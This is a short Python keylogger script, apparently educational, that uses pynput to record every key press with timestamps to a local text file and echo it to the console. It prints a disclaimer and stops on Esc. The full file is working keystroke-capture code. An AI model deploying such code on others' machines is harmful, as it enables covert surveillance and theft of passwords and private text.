import logging
from pynput import keyboard

def show_disclaimer():
    disclaimer = """
    ***************************************
    *            DISCLAIMER               *
    ***************************************
    This keylogger script is for educational purposes only.
    Use it responsibly and only in authorized environments.
    Unauthorized use of this script is illegal and unethical.
    ***************************************
    """
    print(disclaimer)

def setup_logging():
    logging.basicConfig(
        filename="keylogger_output.txt",
        filemode="w",
        level=logging.INFO,
        format="%(asctime)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    print("Logging has been set up. Key presses will be saved to 'keylogger_output.txt'.")

def on_press(key):
    try:
        key_info = f"Key pressed: {key.char}"
    except AttributeError:
        key_info = f"Special key pressed: {key}"
    print(key_info)
    logging.info(key_info)
    if key == keyboard.Key.esc:
        print("Stopping the keylogger...")
        return False

def main():
    show_disclaimer()
    setup_logging()
    print("Keylogger is running. Press 'Esc' to stop.\n")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
